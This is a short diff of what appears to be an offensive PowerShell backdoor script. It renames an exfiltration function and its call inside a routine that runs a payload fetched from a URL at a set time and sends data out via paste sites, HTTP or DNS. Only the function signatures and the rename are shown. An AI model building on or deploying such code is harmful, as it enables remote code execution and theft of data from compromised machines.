@@ -166,7 +166,7 @@ function Logic-Execute-OnTime ($PayloadURL, $Arguments, $time, $CheckURL, $StopS
             $exec++
             if ($exfil -eq $True)
             {
-                Do-Exfiltration "$pastename" "$pastevalue" "$ExfilOption" "$dev_key" "$username" "$password" "$URL" "$DomainName" "$AuthNS"
+                Do-Exfiltration-Time "$pastename" "$pastevalue" "$ExfilOption" "$dev_key" "$username" "$password" "$URL" "$DomainName" "$AuthNS"
             }
             if ($exec -eq 1)
             {
@@ -184,7 +184,7 @@ function Logic-Execute-OnTime ($PayloadURL, $Arguments, $time, $CheckURL, $StopS
 
 
 $exfiltration = @'
-function Do-Exfiltration($pastename,$pastevalue,$ExfilOption,$dev_key,$username,$password,$URL,$DomainName,$AuthNS)
+function Do-Exfiltration-Time($pastename,$pastevalue,$ExfilOption,$dev_key,$username,$password,$URL,$DomainName,$AuthNS)
 {
     function post_http($url,$parameters) 
     { 
